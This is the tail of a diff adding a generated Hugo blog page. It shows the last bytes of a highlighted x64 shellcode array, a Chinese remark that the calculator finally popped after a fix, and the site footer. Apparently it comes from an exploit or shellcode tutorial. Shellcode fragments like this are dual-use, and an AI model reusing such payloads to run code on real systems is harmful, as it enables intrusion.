+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xD0</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xE1</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0xC2</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x83</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xEC</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x81</span>, <span style="color:#ae81ff">0xE4</span>, <span style="color:#ae81ff">0xF0</span>, <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0xD6</span>]);
+</span></span></code></pre></div><p>改完以后终于看到了计算器。🎉</p>
+<ul class="pa0">
+  
+</ul>
+<div class="mt6 instapaper_ignoref">
+      
+      
+      </div>
+    </div>
+
+    <aside class="w-30-l mt6-l">
+
+
+
+
+</aside>
+
+  </article>
+
+    </main>
+    <footer class="bg-black bottom-0 w-100 pa3" role="contentinfo">
+  <div class="flex justify-between">
+  <a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="http://localhost:1313/" >
+    &copy;  My New Hugo Site 2024 
+  </a>
+    <div><div class="ananke-socials"></div>
+</div>
+  </div>
+</footer>
+
+  </body>
+</html>
